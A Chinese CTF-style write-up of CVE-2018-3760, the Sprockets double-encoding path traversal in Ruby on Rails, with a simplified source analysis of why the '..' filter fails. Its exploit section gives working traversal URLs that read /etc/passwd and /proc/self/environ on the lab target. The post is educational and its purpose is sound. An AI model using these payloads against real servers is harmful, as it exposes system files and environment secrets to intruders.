---
title: 'vulfocusrails-cve_2018_3760漏洞详解+源码分析'
abbrlink: 555a65e4
categories: 
  - ctf题解/web
date: 2026-05-14 22:24:22
---# vulfocus/rails-cve_2018_3760漏洞详解+源码分析



本文参考技术文章：

https://qkl.seebug.org/vuldb/ssvid-97466

## 0x01 漏洞介绍：

```
 名称: vulfocus/rails-cve_2018_3760:new

 描述: 

Ruby On Rails 是著名的 Ruby Web 开发框架，它在开发环境中使用 Sprockets 作为静态文件服务器。Sprockets 是一个编译和分发静态资源文件的 Ruby 库。

Sprockets 3.7.1及更低版本存在二次解码导致的路径遍历漏洞。攻击者可以%252e%252e/用来访问根目录并读取或执行目标服务器上的任何文件。


```



---

## 0x02 知识点：

>### 1.二次编码绕过
>
>已知：
>
>`.`的url编码是：%2e
>
>`%2e`的url编码是：%252e
>
>所以：
>
>上一级目录原本是：../
>
>为了绕过我们改成：`%252e%252e/`
>
>![image-20260415164145960](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260415164146022.png)





>### 2.简单了解RoR（ruby on rails）
>
>![image-20260415140906356](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260415140906434.png)
>
>笔者十分认同这个理念，还看了篇文章https://zhuanlan.zhihu.com/p/103633703
>
>评论也有大佬在讨论，顺便纠正了文章一些错误



>### 3.顺便了解Sprockets
>
>如果网页里引用了 20 个 JS 文件和 10 个 CSS 文件，浏览器就得发起 30 次请求，这会让加载速度变慢。
>
>而且，如果你用了 Sass 写样式，或者用 CoffeeScript 写脚本，浏览器读不懂。
>
>Sprockets 的出现就是为了干这三件事：
>
>- **合并（Concatenation）：** 把几十个小 JS 文件揉成一个大的 `application.js`，减少 HTTP 请求次数。
>- **预编译（Preprocessing）：** 自动把 Sass 变成 CSS，把 CoffeeScript 变成 JavaScript。
>- **依赖管理：** 只需要在文件开头写一行注释（比如 `//= require jquery`），它就能自动帮你把需要的文件找出来并排好先后顺序。
>
>---------------->
>
>**如何使用Sprockets？**
>
>查看源码(https://github.com/rails/sprockets-rails/blob/49bf8022c8d3e1d7348b3fe2e0931b2e448f1f58/lib/sprockets/railtie.rb#L50)
>
>```
>def build_environment(app, initialized = nil)
>     ....
>
>      env = Sprockets::Environment.new(app.root.to_s)	//env是sprockets引擎
>	...
>	  env	//返回env
>      end
>      
>.....
>      if config.assets.compile
>        app.assets = self.build_environment(app, true)	
>        //app.assets就是sprockets库里面的Environment类的实例
>        app.routes.prepend do
>          mount app.assets => config.assets.prefix
>        end
>      end
>.....       
>       
>      
>      
>config.assets.prefix = "/assets"
>.......
>app.routes.prepend do
>  mount app.assets => config.assets.prefix	//mount为挂载：意味着所有的/assets后面的内容都让app.assets解析
>end
>```
>
>**凡是 `/assets/` 开头的请求，全部交给 Sprockets 解析**

---

## 0x03 exp

目标是：assets/file:///etc/passwd，访问得到

```
assets/file:%2f%2f/etc/passwd
```

![image-20260415153257703](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260415153257769.png)

发现可利用路径/usr/src/blog/app/assets/images/

进行二次绕过

```
/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
```

![image-20260415151631048](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260415151631149.png)

读取flag

```
/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/proc/self/environ 
```

![image-20260415160723692](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260415160723768.png)

## 0x04 漏洞原理

这么好用的Sprockets怎么就产生漏洞了呢？

为了方便理解原理，一下代码进行了简化

文件一：server.rb（对`..`的过滤）

```
# server.rb
def call(env)
    # 1. 第一次解码：将 %252e 解码为 %2e
    path = Rack::Utils.unescape(env['PATH_INFO'].to_s.sub(/^\//, ''))
	# 2. path 值为 ".../%2e%2e/%2e%2e/Windows/win.ini"
	
    # forbidden_request过滤
    if forbidden_request?(path)
        return forbidden_response(env)
    end
end

private
def forbidden_request?(path)
    path.include?("..") || absolute_path?(path)
    #因为我们被解码后值是%2e%2e，并不是”..“，所以没被发现
end
```

文件二：sprockets/path_utils.rb

```
# sprockets/path_utils.rb
def split_file_uri(uri)
    # ... 略 ...
    
    # 3. 第二次解码：
    # 将上一步剩下的 "%2e%2e" 解码为 ".."
    path = URI::Generic::DEFAULT_PARSER.unescape(path)
    
    # 4. path 变成："C:/.../assets/../../../../../../Windows/win.ini"
    path.force_encoding(Encoding::UTF_8)
    [scheme, host, path, query]
end
```

文件一：sprockets/loader.rb简化版

```
# sprockets/loader.rb 
def load_from_unloaded(unloaded)
    filename = unloaded.filename # 获取上面那个path
    
    # 5. 寻找处理器：处理对应后缀的文件
    processor = find_processors_for_extension(".erb")
    
    if processor
        # 6. 执行：如果找到了 ERB 处理器，会运行 erb 文件里 <% %> 之间的任何 Ruby 代码
        render_asset(filename) 
    else
        # 如果是 .ini，没找到处理器，就直接当成文本读取返回
        read_file_directly(filename)
    end
end
```



## 0x05 总结

`app.assets` 就是 `Sprockets::Environment`。

那么访问 `/assets/file://...` 时，由于是由Sprockets解析，请求实际上是给了app.assets，也就是Sprockets库里的Environment类所创建的实例。

这个实例在寻找资源时，会调用它内部的 `find_asset` 函数。

**而 CVE-2018-3760 这个漏洞本质上就是： `Sprockets::Environment` 这个引擎在 `find_asset` 过程中，没能识别出经过双重编码处理后的穿越路径。**















































